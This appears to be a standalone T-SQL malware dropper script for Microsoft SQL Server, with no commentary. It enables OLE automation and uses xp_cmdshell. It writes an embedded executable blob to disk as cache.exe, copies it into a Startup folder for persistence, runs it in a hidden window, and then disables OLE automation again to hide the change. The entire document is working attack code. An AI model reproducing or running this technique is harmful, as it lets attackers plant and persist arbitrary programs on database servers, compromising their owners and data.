DECLARE @payloadBytes VARBINARY(MAX) = 0x4D5A90000300000004000000FFFF0000B800000000000000;
execute sp_configure 'show advanced options', 1; RECONFIGURE;
execute sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
execute master..xp_cmdshell N'mkdir "D:\Stage\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul';
DECLARE @stream INT;
execute sp_OACreate 'ADODB.Stream', @stream OUT;
execute sp_OASetProperty @stream, 'Type', 1;
execute sys.sp_OAMethod @stream, 'Open';
execute sys.sp_OAMethod @stream, 'Write', NULL, @payloadBytes;
execute sys.sp_OAMethod @stream, 'savetofile', NULL, 'D:\Stage\cache.exe', 2;
execute sys.sp_OAMethod @stream, 'savetofile', NULL, 'D:\Stage\Microsoft\Windows\Start Menu\Programs\Startup\cache.exe', 2;
execute sys.sp_OAMethod @stream, 'Close';
execute sp_OADestroy @stream;
DECLARE @launcher INT, @exitCode INT;
execute sp_OACreate 'WScript.Shell', @launcher OUT;
execute sys.sp_OAMethod @launcher, 'Run', @exitCode OUT, 'D:\Stage\cache.exe', 0, 0;
execute sp_OADestroy @launcher;
execute sp_configure 'Ole Automation Procedures', 0; RECONFIGURE;
GO
